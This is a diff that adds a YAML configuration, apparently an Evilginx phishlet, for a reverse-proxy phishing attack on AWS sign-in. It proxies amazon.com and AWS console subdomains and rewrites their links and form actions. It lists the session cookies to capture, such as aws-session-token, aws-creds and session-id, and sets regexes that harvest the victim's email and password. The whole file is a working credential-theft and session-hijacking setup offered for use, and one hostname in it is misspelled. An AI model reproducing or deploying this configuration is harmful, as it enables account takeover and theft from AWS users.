@@ -1,0 +1,38 @@
+name: 'aws'
+author: '@wilson'
+min_ver: '2.0.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'amazon.com', session: true, is_landing: false}
+  - {phish_sub: 'aws', orig_sub: 'aws', domain: 'amazon.com', session: true, is_landing: false}
+  - {phish_sub: 'console.aws', orig_sub: 'console.aws', domain: 'amazon.com', session: false, is_landing: false}
+  - {phish_sub: 'signin.aws', orig_sub: 'signin.aws', domain: 'amazon.com', session: true, is_landing: true}
+  - {phish_sub: 'ap-northeast-1.console.aws', orig_sub: 'ap-northeast-1.console.aws', domain: 'amazon.com', session: true, is_landing: false}
+  - {phish_sub: 'fls-na', orig_sub: 'fls-na', domain: 'amazon.com', session: false, is_landing: false}
+  - {phish_sub: 'images-na', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', session: false, is_landing: false}
+sub_filters:
+  - {hostname: 'www.amazon.com', sub: 'www', domain: 'amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {hostname: 'www.amazon.com', sub: 'www', domain: 'amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {hostname: 'signin.aws.amazon.com', sub: 'signin.aws', domain: 'amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {hostname: 'signin.aws.amazon.com', sub: 'signin.aws', domain: 'amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {hostname: 'signin.aws.amazon.com', sub: 'www', domain: 'amazon.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {hostname: 'console.aws.amazon.com', sub: 'console.aws', domain: 'amazon.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {hostname: 'ap-northeast-1.console.aws', sub: 'ap-northeast-1.console.aws', domain: 'amazon.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {hostname: 'fls-na.amazon.com', sub: 'fls-na', domain: 'amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {hostname: 'fls-na.amazon.com', sub: 'fls-na', domain: 'amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {hostname: 'images-na.ssl-iamges-amazon.com', sub: 'images-na', domain: 'ssl-images-amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {hostname: 'images-na.ssl-iamges-amazon.com', sub: 'images-na', domain: 'ssl-images-amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+auth_tokens:
+  - domain: '.amazon.com'
+    keys: ['__utma','__utmb','__utmc','__utmz','s_fid','s_nr','s_vn','x-wl-uid','aws-at-main','sess-aws-at-main','aws-session-id','session-id','aws-session-id-time','session-id-time','aws-session-token','aws-userInfo','aws-ubid-main','ubid-main','aws-x-main','aws-target-data', 'aws-target-session-id', 'aws-target-static-id', 'aws-target-visitor-id']
+  - domain: '.aws.amazon.com'
+    keys: ['aws-account-data', 'awsc-actm','aws-priv','_mkto_trk', 'aws-first-visit-2','_mkto_trk']
+  - domain: 'ap-northeast-1.console.aws.amazon.com'
+    keys: ['aws-addr', 'aws-creds', 'JSESSIONID', 'seance']
+user_regex:
+  key: 'awsEmail'
+  re: '(.*)'
+pass_regex:
+  key: 'password'
+  re: '(.*)'
+landing_path:
+  - '/signin?redirect_uri=https%3A%2F%2Fconsole.aws.amazon.com%2Fconsole%2Fhome%3Fstate%3DhashArgs%2523%26isauthcode%3Dtrue&client_id=arn%3Aaws%3Aiam%3A%3A015428540659%3Auser%2Fhomepage&forceMobileApp=0'
